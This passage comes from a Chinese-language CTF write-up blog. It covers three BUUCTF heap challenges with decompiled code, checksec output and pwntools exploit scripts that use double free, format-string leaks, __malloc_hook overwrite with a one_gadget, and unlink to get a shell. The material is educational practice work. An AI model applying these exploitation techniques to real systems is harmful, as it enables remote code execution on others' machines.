<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  stream = fopen(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Emmmmmm!Maybe you want Fool me!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  byte_6020A0 = <span class="number">96</span>;</span><br><span class="line">  fgets(s, <span class="number">45</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>后门函数</p>
</blockquote>
<p><strong>delete</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(*(<span class="type">void</span> **)ptr[v1]);</span><br><span class="line"><span class="built_in">free</span>(*((<span class="type">void</span> **)ptr[v1] + <span class="number">1</span>));</span><br><span class="line"><span class="built_in">free</span>(ptr[v1]);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>free指针没有清零，可以直接接上</p>
</blockquote>
<h3 id="3exp-31"><a class="markdownIt-Anchor" href="#3exp-31"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./something&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./something&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="string">&quot;25754&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">ba_sz,ba_text,na_sz,na_text</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(ba_sz))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(ba_text))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(na_sz))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(na_text))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">idx</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	add(<span class="number">0x50</span>,<span class="string">&#x27;0000&#x27;</span>,<span class="number">0x50</span>,<span class="string">&#x27;1111&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">	add(<span class="number">0x50</span>,<span class="string">&#x27;2222&#x27;</span>,<span class="number">0x50</span>,<span class="string">&#x27;3333&#x27;</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line">	delete(<span class="number">1</span>)</span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	add(<span class="number">0x50</span>,p64(<span class="number">0x602098</span>),<span class="number">0x50</span>,<span class="string">&#x27;Chunk_2&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">	add(<span class="number">0x50</span>,<span class="string">&#x27;Chunk_3&#x27;</span>,<span class="number">0x50</span>,<span class="string">&#x27;Chunk_4&#x27;</span>)<span class="comment">#1--&gt;in 0x602098</span></span><br><span class="line">	add(<span class="number">0x50</span>,<span class="string">&#x27;f&#x27;</span>,<span class="number">0x60</span>,<span class="string">&#x27;2&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">	view(<span class="number">4</span>)</span><br><span class="line">	p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="gyctf_2020_some_thing_interesting"><a class="markdownIt-Anchor" href="#gyctf_2020_some_thing_interesting"></a> gyctf_2020_some_thing_interesting</h2>
<h3 id="1checksec-43"><a class="markdownIt-Anchor" href="#1checksec-43"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<h3 id="2ida-42"><a class="markdownIt-Anchor" href="#2ida-42"></a> 2.IDA</h3>
<p><strong>sub_B7A</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0</span>, s1, <span class="number">0x13</span>uLL);</span><br><span class="line"> <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(s1, <span class="string">&quot;OreOOrereOOreO&quot;</span>, <span class="number">14uLL</span>) )   <span class="comment">// 只比较了前14个，后面可以带东西</span></span><br><span class="line"> &#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;Emmmmmm!Maybe you want Fool me!&quot;</span>);</span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>字符串格式化漏洞，这里可以泄露地址</p>
</blockquote>
<p><strong>delete</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;#######################&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;#     Delete Oreo     #&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;#---------------------#&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; Oreo ID : &quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">10</span> || !chunk[v1] )        <span class="comment">// 检查idx合法</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Emmmmmm!Maybe you want Fool me!&quot;</span>);</span><br><span class="line">    Exit();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(chunk[v1]);                              <span class="comment">// 指针未清零</span></span><br><span class="line">  <span class="built_in">free</span>(re_chunk[v1]);                           <span class="comment">// 导致uaf</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;#---------------------#&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;#      ALL Down!      #&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;#######################&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>free</strong>后指针没有置零，造成uaf</p>
</blockquote>
<h3 id="3exp1-偏移量计算"><a class="markdownIt-Anchor" href="#3exp1-偏移量计算"></a> 3.exp1 偏移量计算</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&quot;./gyctf_2020_some_thing_interesting&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/mnt/d/CTF/Question/BUUCTF/libc/64/libc-2.23.so&quot;</span>)</span><br><span class="line">sh = <span class="number">0</span></span><br><span class="line">counter=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>(<span class="params">i</span>):</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;OreOOrereOOreO%&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;$p&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_in</span>(<span class="params">i</span>):</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">	sh.recvuntil(<span class="string">&quot;OreOOrereOOreO&quot;</span>)</span><br><span class="line">	str1 = sh.recv(<span class="number">16</span>)</span><br><span class="line">	<span class="comment">#print str1</span></span><br><span class="line">	<span class="keyword">if</span> <span class="string">&quot;0x7f&quot;</span> <span class="keyword">in</span> str1:</span><br><span class="line">		success(<span class="string">&quot;This can be tested&quot;</span>)</span><br><span class="line">		<span class="keyword">global</span> counter </span><br><span class="line">		counter+= <span class="string">&quot; &quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot; &quot;</span></span><br><span class="line">		<span class="built_in">print</span> <span class="string">&quot;\n&quot;</span></span><br><span class="line">		<span class="built_in">print</span> <span class="string">&quot;\n&quot;</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line">		</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">offset_count</span>(<span class="params">ip,port,mode,debug,i</span>):</span><br><span class="line">	<span class="keyword">global</span> sh</span><br><span class="line">	<span class="keyword">if</span> debug==<span class="number">0</span>:</span><br><span class="line">		context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line">	<span class="keyword">if</span> mode==<span class="number">0</span>:</span><br><span class="line">		sh = process(<span class="string">&quot;./gyctf_2020_some_thing_interesting&quot;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">	start(i)</span><br><span class="line">	check_in(i)</span><br><span class="line">	sh.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>,<span class="number">20</span>):</span><br><span class="line">		<span class="comment">#success(&quot;Now round %d&quot;,i)</span></span><br><span class="line">		offset_count(<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,i)</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;can be tested &gt;&quot;</span></span><br><span class="line">	<span class="built_in">print</span> counter</span><br></pre></td></tr></table></figure>
<p>得到</p>
<p><code> 4  6  7  10  11  12  14  16  17  19</code></p>
<p>最终得到偏移量为 <code>17</code></p>
<blockquote>
<p>这里也可以使用 *<em>b <em>$rebase(偏移地址)</em></em> 来慢慢计算得到偏移</p>
</blockquote>
<h3 id="3exp2-攻击"><a class="markdownIt-Anchor" href="#3exp2-攻击"></a> 3.exp2 攻击</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&quot;./gyctf_2020_some_thing_interesting&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/mnt/d/CTF/Question/BUUCTF/libc/64/libc-2.23.so&quot;</span>)</span><br><span class="line">sh = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_addr</span>():</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;OreOOrereOOreO%17$p&quot;</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">	sh.recvuntil(<span class="string">&quot;OreOOrereOOreO0x&quot;</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">int</span>(sh.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">o_sz,o_text,re_sz,re_text</span>):</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(o_sz))</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;: &quot;</span>,o_text)</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(re_sz))</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;: &quot;</span>,re_text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,o_text,re_text</span>):</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;: &quot;</span>,o_text)</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;: &quot;</span>,re_text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">ip,port,debug,mode</span>):</span><br><span class="line">	<span class="keyword">global</span> sh</span><br><span class="line">	<span class="keyword">if</span> debug==<span class="number">0</span>:</span><br><span class="line">		context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line">	<span class="keyword">if</span> mode==<span class="number">0</span>:</span><br><span class="line">		sh = process(<span class="string">&quot;./gyctf_2020_some_thing_interesting&quot;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line"></span><br><span class="line">	leak = leak_addr()</span><br><span class="line">	base = leak-<span class="number">0x20830</span></span><br><span class="line">	one_gadget = <span class="number">0xf1147</span>+base</span><br><span class="line">	malloc_hook = base+libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">	success(<span class="string">&quot;base  -&gt; 0x%x&quot;</span>,base)</span><br><span class="line">	success(<span class="string">&quot;one gadget  -&gt; 0x%x&quot;</span>,one_gadget)</span><br><span class="line">	success(<span class="string">&quot;malloc hook  -&gt; 0x%x&quot;</span>,malloc_hook)</span><br><span class="line">	</span><br><span class="line">	create(<span class="number">0x68</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="number">0x68</span>,<span class="string">&#x27;1111&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">	create(<span class="number">0x68</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="number">0x68</span>,<span class="string">&#x27;1111&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">	delete(<span class="number">1</span>)</span><br><span class="line">	delete(<span class="number">2</span>)</span><br><span class="line">	delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">	create(<span class="number">0x68</span>,p64(malloc_hook-<span class="number">35</span>),<span class="number">0x68</span>,<span class="string">&#x27;1111&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">	create(<span class="number">0x68</span>,p64(malloc_hook-<span class="number">35</span>),<span class="number">0x68</span>,<span class="string">&#x27;1111&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">	create(<span class="number">0x68</span>,p64(malloc_hook-<span class="number">35</span>),<span class="number">0x68</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x13</span>+p64(one_gadget)) <span class="comment">#1</span></span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="string">&quot;20&quot;</span>)</span><br><span class="line">	sh.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	pwn(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29443</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<h2 id="hitcon_2014_stkof"><a class="markdownIt-Anchor" href="#hitcon_2014_stkof"></a> hitcon_2014_stkof</h2>
<h3 id="1checksec-44"><a class="markdownIt-Anchor" href="#1checksec-44"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-43"><a class="markdownIt-Anchor" href="#2ida-43"></a> 2.IDA</h3>
<p>程序太简陋了，几乎没有交互，能用的有三个功能</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">sz</span>):</span><br><span class="line">	p.snedline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.snedline(<span class="built_in">str</span>(sz))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">chunk,size,strs</span>):</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendline(chunk)    </span><br><span class="line">    p.sendline(size)</span><br><span class="line">    p.sendline(strs)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">chunk</span>):</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendline(chunk)</span><br></pre></td></tr></table></figure>
<p><strong>sub_4009E8() edit</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = fread(ptr, <span class="number">1uLL</span>, n, <span class="built_in">stdin</span>); i &gt; <span class="number">0</span>; i = fread(ptr, <span class="number">1uLL</span>, n, <span class="built_in">stdin</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr += i;</span><br><span class="line">    n -= i;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>没有控制输入范围，可以堆溢出</p>
</blockquote>
<p><strong>全局变量s</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.bss:0000000000602104                 align 40h</span><br><span class="line">.bss:0000000000602140 ; char *s[1049600]</span><br><span class="line">.bss:0000000000602140 s               dq ?                    ; DATA XREF: add+78↑w</span><br><span class="line">.bss:0000000000602140                                         ; edit+60↑r ...</span><br><span class="line">.bss:0000000000602148                 db    ? ;</span><br><span class="line">.bss:0000000000602149                 db    ? ;</span><br><span class="line">.bss:000000000060214A                 db    ? ;</span><br></pre></td></tr></table></figure>
<p><strong>思路</strong></p>
<blockquote>
<blockquote>
<p>有堆溢出，有全局指针变量，没有输出函数，所以用unlink改<code>free@got</code> 为 <code>puts</code>，再次调用<code>free</code>就相当于调用<code>puts</code>，从而<code>libc leak</code></p>
</blockquote>
<blockquote>
<p>填入<code>onegedget</code>或者该函数为<code>system</code>并执行binsh，从而getshell</p>
</blockquote>
</blockquote>
<h3 id="3gdb-8"><a class="markdownIt-Anchor" href="#3gdb-8"></a> 3.GDB</h3>
<p><strong>unlink部份</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#unlink</span></span><br><span class="line"><span class="comment">#code:</span></span><br><span class="line">    alloc(<span class="number">0x100</span>)        <span class="comment"># idx 1</span></span><br><span class="line">    alloc(<span class="number">0x30</span>)         <span class="comment"># idx 2</span></span><br><span class="line">    alloc(<span class="number">0x80</span>)         <span class="comment"># idx 3</span></span><br><span class="line">    </span><br><span class="line">    head = <span class="number">0x602140</span>  <span class="comment">#全局变量</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#fake chunk</span></span><br><span class="line">    payload = p64(<span class="number">0</span>)      </span><br><span class="line">    payload += p64(<span class="number">0x20</span>) </span><br><span class="line">    payload += p64(head + <span class="number">16</span> - <span class="number">0x18</span>)  </span><br><span class="line">    payload += p64(head + <span class="number">16</span> - <span class="number">0x10</span>) </span><br><span class="line">    payload += p64(<span class="number">0x20</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    payload += p64(<span class="number">0x30</span>)</span><br><span class="line">    payload += p64(<span class="number">0x90</span>)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">	</span><br><span class="line">    <span class="comment">#unlink</span></span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line">    gdb.attach(p)</span><br></pre></td></tr></table></figure>
<p><strong>gdb</strong></p>
